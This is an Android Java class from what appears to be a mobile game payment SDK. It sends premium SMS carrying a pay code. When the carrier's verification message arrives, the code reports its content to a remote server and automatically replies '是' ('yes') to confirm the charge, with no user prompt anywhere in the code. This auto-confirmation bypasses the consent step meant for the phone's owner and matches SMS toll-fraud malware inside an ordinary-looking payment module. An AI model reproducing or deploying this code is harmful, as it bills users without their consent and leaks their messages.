package mobi.zty.pay.sdk.beiqing;

import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;

import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.sdk.game.Constants;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.game.bean.FeeInfo;
import mobi.zty.sdk.game.bean.GroupFeeInfo;
import mobi.zty.sdk.game.bean.MkInfo;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.HttpRequestt;
import mobi.zty.sdk.util.StringUtil;
import mobi.zty.sdk.util.Util_G;

import org.json.JSONArray;
import org.json.JSONObject;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Message;

/**
 *北青支付管理类
 * @author Administrator
 *
 */
public class BeiQingInstance extends PaymentInterf{
	private static BeiQingInstance instance;
	private Handler callBHandler = null;
	private Context context;
	public static BeiQingInstance getInstance(){
		if(instance==null){
			instance = scyMMpay();
		}
		return instance;
	}
	private static synchronized BeiQingInstance scyMMpay(){
		if(instance==null){
			instance =  new BeiQingInstance();
		}
		return instance;
	}
	@Override
	public void init(Context context, Object... parameters) {
		this.context = context;
		callBHandler = (Handler) parameters[0];
	}

	@Override
	public void pay(final Context context, Object... parameters) {
		final String ext = (String) parameters[0];
		int feeIndex = (Integer) parameters[1];
		Helper.sendPayMessageToServer(PayConfig.BEIQING_PAY, "进入支付：", feeIndex);
		FeeInfo feeInfo = (FeeInfo) parameters[2];
		MkInfo mkInfo = (MkInfo) parameters[3];
		final String payCode = feeInfo.payCode;
		final String send_num = mkInfo.sendNum;
		String sms_content = payCode;
		Intent itSend = new Intent(Constants.SENT_SMS_ACTION);  
		itSend.putExtra("fee_index", feeIndex);
        PendingIntent mSendPI = PendingIntent.getBroadcast(context.getApplicationContext(), 0, itSend, PendingIntent.FLAG_ONE_SHOT);//这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。   
        Util_G.sendTextMessage(context, send_num, sms_content, mSendPI, 0);
        Util_G.debugE("beiqing_pay", "beiqing_data->"+sms_content+" send_num->"+send_num);
        Helper.sendPayMessageToServer(PayConfig.BEIQING_PAY, "发送短信sms_content="+sms_content+"send_num="+send_num, feeIndex);
	}
	
	@Override
	public void sendVerifyCode(Object... parameters) {
		String sendFrom = (String) parameters[0];
		String content = (String) parameters[1];
		int feeIndex = (Integer) parameters[2];
		Helper.sendPayMessageToServer(PayConfig.BEIQING_PAY, "读取到验证码的短信："+content, feeIndex);
		GameSDK instance = GameSDK.getInstance();
		GroupFeeInfo groupFeeInfo = instance.getCurgGroupFeeInfo();
		if (groupFeeInfo == null)  return;
		String vertifyNum = instance.mkMap.get(PayConfig.BEIQING_PAY).vertifyNum;
		Util_G.debugE("BEIQING_PAY","vertifyNum——》》"+vertifyNum +"  content==>"+content);

		groupFeeInfo.getIntdexVerifyMap().put(feeIndex, 2);
		if (sendFrom.contains(vertifyNum)) {
			Intent itSend = new Intent(Constants.SENT_SMS_ACTION);
			PendingIntent mSendPI = PendingIntent.getBroadcast(
					context.getApplicationContext(), 0, itSend,
					PendingIntent.FLAG_ONE_SHOT);// 这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。
			itSend.putExtra("fee_index", feeIndex);
			Util_G.sendTextMessage(context, sendFrom, "是", mSendPI, 0);
			Util_G.debugE("BEIQING_PAY", "BEIQING_PAY验证码确认短信" + sendFrom);
			Helper.sendPayMessageToServer(PayConfig.BEIQING_PAY, "回复验证码短信是", feeIndex);
		}else{
			Helper.sendPayMessageToServer(PayConfig.BEIQING_PAY, "后台没给对应的验证码端口："+sendFrom, feeIndex);
		}
	
		// TODO Auto-generated method stub
		super.sendVerifyCode(parameters);
	}
	
}
